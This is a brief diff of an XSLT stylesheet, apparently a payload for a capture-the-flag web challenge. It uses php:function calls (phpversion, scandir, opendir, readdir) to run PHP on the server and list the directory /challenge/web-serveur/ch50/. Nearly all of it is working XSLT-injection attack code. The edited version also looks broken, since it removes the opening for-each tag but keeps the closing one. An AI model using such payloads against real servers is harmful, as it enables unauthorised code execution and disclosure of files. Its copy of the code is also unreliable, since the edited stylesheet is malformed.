@@ -4,8 +4,10 @@
   extension-element-prefixes="php">
   
   <xsl:template match="/">
-    <xsl:value-of select="php:function('phpversion')"/> - PHP OK<br/>
-    <xsl:for-each select="php:function('scandir','/challenge/web-serveur/ch50/')">
+<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
+<xsl:value-of select="php:function('readdir')"/> -
       <xsl:value-of select="."/><br/>
     </xsl:for-each>
   </xsl:template>
